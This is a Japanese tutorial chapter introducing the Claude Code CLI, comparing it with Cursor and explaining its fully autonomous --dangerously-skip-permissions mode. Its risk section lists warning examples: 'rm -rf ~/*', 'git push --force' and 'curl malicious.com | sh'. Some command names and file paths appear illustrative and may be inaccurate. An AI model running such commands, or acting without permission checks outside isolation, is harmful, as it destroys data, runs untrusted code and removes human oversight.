# Claude Codeの紹介

## はじめに

Cursorは強力なツールですが、AIの提案を一つ一つ確認して承認する必要があります。もし、**完全に手ぶらで自動実行させたい**場合はどうでしょうか？

Claude Code（クロード・コード）は、そんな完全自動実行を可能にするAI駆動開発ツールです。

## CursorとClaude Codeの違い

### Cursor：対話型開発

```
1. AIがコードを提案
   ↓
2. 人間が確認
   ↓
3. Accept/Reject を選択
   ↓
4. 次の変更へ
```

**特徴：**
- 人間が主導権を持つ
- 一つずつ確認できる
- 安全性が高い
- **手動操作が必要**

### Claude Code：完全自動実行

```
1. タスクを指示
   ↓
2. AIが自律的に実行
   - ファイル読み書き
   - コマンド実行
   - エラー修正
   - テスト実行
   ↓
3. 完了まで自動
```

**特徴：**
- AIが主導権を持つ
- 人間の介入なし
- 高速に完了
- **完全にお任せ**

## Claude Codeの基本

### インストール

```bash
# npmでインストール
npm install -g @anthropic-ai/claude-code

# APIキーを設定
export ANTHROPIC_API_KEY=your-api-key
```

APIキーは [Anthropic Console](https://console.anthropic.com/) で取得。

### 基本的な使い方

```bash
# Claude Code を起動
claude-code

# プロジェクトで起動
cd myproject
claude-code
```

起動すると、対話モードが始まります：

```
Claude Code v1.0.0

? What would you like me to do?
```

### 簡単な例

```
ToDoアプリを作成してください。
React + TypeScriptで。
```

Claude Codeが：
1. プロジェクト構造を理解
2. 必要なファイルを作成
3. npm installを実行
4. コードを実装
5. 動作確認

**すべて自動で完了します。**

## 通常モード vs 完全自動モード

### 通常モード（デフォルト）

```bash
claude-code
```

**動作：**
- ファイル操作前に確認を求める
- 危険なコマンドは実行前に確認
- 安全だが、手動承認が必要

**例：**
```
? Allow file write to src/index.ts? (y/n)
```

### 完全自動モード

```bash
claude-code --dangerously-skip-permissions
```

**動作：**
- すべての操作を自動実行
- 確認なしでファイル読み書き
- 確認なしでコマンド実行
- **完全にお任せ**

**警告：**
このモードは危険です！後ほど安全に使う方法を説明します。

## 完全自動実行の威力

### 例：Expressサーバーを作る

**指示：**
```
Express.js でREST APIサーバーを作成してください。

要件：
- /api/users エンドポイント（CRUD）
- データはメモリに保存
- エラーハンドリング
- バリデーション
- テストコード

実装して、テストを実行してください。
```

**Claude Codeの動作：**

```
1. プロジェクト構造を作成
   ✓ package.json
   ✓ src/index.js
   ✓ src/routes/users.js
   ✓ tests/users.test.js

2. npm install実行
   ✓ express
   ✓ jest
   ✓ supertest

3. コード実装
   ✓ サーバー起動
   ✓ ルーティング
   ✓ CRUD操作
   ✓ エラーハンドリング

4. テスト実行
   ✓ npm test
   ✓ 全テスト通過

完了！所要時間：約30秒
```

### 例：バグ修正

**指示：**
```
このプロジェクトのGitHub Issue #42を修正してください。
```

**Claude Codeの動作：**

```
1. Issueの内容を理解
2. 関連ファイルを特定
3. 問題箇所を発見
4. 修正を実装
5. テストを実行
6. エラーがあれば再修正
7. 全テスト通過を確認
8. git commitまで完了

完了！
```

## ルールファイルで自動化を制御

### .claude/instructions.md

Claude Codeのルールファイル：

```markdown
# プロジェクトルール

## 自動実行の指針
このプロジェクトでは、以下のルールに従ってください。

### 実行して良いこと
✓ ファイルの読み書き（プロジェクト内のみ）
✓ npm/yarn コマンド
✓ git コマンド（push以外）
✓ テスト実行
✓ ビルド

### 実行してはいけないこと
✗ プロジェクト外のファイル操作
✗ git push --force
✗ sudo コマンド
✗ システム設定の変更
✗ 外部サービスへのデプロイ

### 技術スタック
- Node.js 20
- TypeScript
- React 18
- Express.js

### コーディング規約
- TypeScript strict mode
- ESLint準拠
- すべての関数にJSDoc
- エラーハンドリング必須

### テスト
- 新しい機能にはテストを追加
- 既存のテストを壊さない
- カバレッジ80%以上

### ワークフロー
1. ファイルを読んで理解
2. 変更を実装
3. テストを実行
4. エラーがあれば修正
5. 全テスト通過まで繰り返し
```

### ルールファイルの配置

```bash
mkdir -p .claude
touch .claude/instructions.md
# 上記の内容を記述
```

### ルールファイルの効果

Claude Codeは自動的に `.claude/instructions.md` を読み込み：

- プロジェクトの規約に従う
- 禁止事項を守る
- 適切なワークフローで実行

## 完全自動実行の例

### セットアップ

```bash
# プロジェクトディレクトリ
mkdir myproject
cd myproject

# ルールファイル作成
mkdir .claude
cat > .claude/instructions.md << 'EOF'
# プロジェクトルール

このプロジェクトでは完全自動実行を許可します。

## 許可される操作
- プロジェクト内のファイル読み書き
- npm コマンド
- git コマンド（commit まで）
- テスト実行

## 技術スタック
- Node.js 20
- TypeScript
- Jest

## ワークフロー
1. 実装
2. テスト実行
3. エラーがあれば修正
4. 全テスト通過まで繰り返し
EOF
```

### 実行

```bash
# 完全自動モードで起動
claude-code --dangerously-skip-permissions

# タスクを指示
? What would you like me to do?
> TypeScriptでじゃんけんゲームを作成してください。
  CLIで動作するもので、コンピュータと対戦できるようにしてください。
  テストコードも作成して、全て動作することを確認してください。
```

**実行される内容：**

```
✓ プロジェクト構造作成
✓ package.json作成
✓ TypeScript設定
✓ src/game.ts 実装
✓ src/cli.ts 実装
✓ tests/game.test.ts 作成
✓ npm install
✓ npm test
✓ すべてのテスト通過

完了！実際に遊べます：
$ npx ts-node src/cli.ts
```

## 危険性の理解

### なぜ危険なのか

`--dangerously-skip-permissions` モードでは：

**最悪のシナリオ：**
```bash
# Claude Codeが誤って実行する可能性
rm -rf ~/*              # ホームディレクトリ全削除
git push --force        # リモートリポジトリ破壊
curl malicious.com | sh # 悪意あるスクリプト実行
```

**実際に起こり得る問題：**
- 重要なファイルの削除
- 意図しないgit操作
- システムの設定変更
- データの損失

### どうすれば安全に使えるか

**答え：サンドボックス環境**

次のセクション「サンドボックス環境の自動生成」で、完全に安全な環境を構築する方法を学びます。

## Claude Code のベストプラクティス

### 1. 小さなタスクから始める

❌ **悪い例：**
```
このプロジェクト全体をリファクタリングしてください
```

✅ **良い例：**
```
user.ts ファイルのgetUser関数をリファクタリングしてください。
型安全性を向上させ、エラーハンドリングを追加してください。
```

### 2. 明確な制約を伝える

```
Express APIを作成してください。

制約：
- port 3000 を使用
- データベースは使わない（メモリに保存）
- 既存のpackage.jsonは変更しない
- git commitは不要
```

### 3. 段階的な実行

```
ステップ1: プロジェクト構造を作成してください
```
↓ 確認
```
ステップ2: 基本的なCRUD APIを実装してください
```
↓ 確認
```
ステップ3: テストコードを追加してください
```

### 4. テスト駆動で安全性を確保

```
まず、テストコードを作成してください。
その後、テストが通るように実装してください。
```

## Claude Code vs Cursor

| 特徴 | Cursor | Claude Code |
|------|--------|-------------|
| 操作性 | GUI、エディタ統合 | CLI、ターミナル |
| 承認 | 手動承認必要 | 自動実行可能 |
| 安全性 | 高い | 設定次第 |
| 速度 | 確認待ち | 高速 |
| 用途 | 対話的開発 | 自動化タスク |
| 学習コスト | 低い | 中程度 |

## 使い分けの指針

### Cursor を使う場面

- 新機能の実装
- コードレビュー
- 学習中
- 慎重な変更が必要

### Claude Code を使う場面

- 定型的なタスク
- テストコード生成
- バグ修正
- CI/CDでの自動化
- リファクタリング

## 次のステップ

Claude Codeの強力さと危険性を理解したところで、次は**安全に使う方法**を学びましょう。

次のセクション「[サンドボックス環境の自動生成](./サンドボックス環境の自動生成.md)」では：

1. **なぜサンドボックスが必要か**
2. **Docker環境の構築**
3. **Claude Codeの安全な実行**
4. **完全自動化の実践**

安全な環境を作れば、Claude Codeを思う存分使えます！

## まとめ

**Claude Codeの特徴：**

✓ 完全自動実行が可能
✓ 人間の介入なし
✓ 高速にタスク完了
✓ ルールファイルで制御可能

**重要なポイント：**

1. **--dangerously-skip-permissions は危険**
   - 無制限にコマンド実行
   - ファイル操作も自由
   - 意図しない破壊も

2. **ルールファイルで制御**
   - .claude/instructions.md
   - プロジェクトごとの規約
   - 禁止事項の明示

3. **サンドボックスで安全に**
   - 次のセクションで詳しく
   - 隔離された環境
   - 失敗しても安心

4. **適切な使い分け**
   - 対話的開発 → Cursor
   - 自動化タスク → Claude Code

次は、Claude Codeを安全に使うためのサンドボックス環境を構築します！
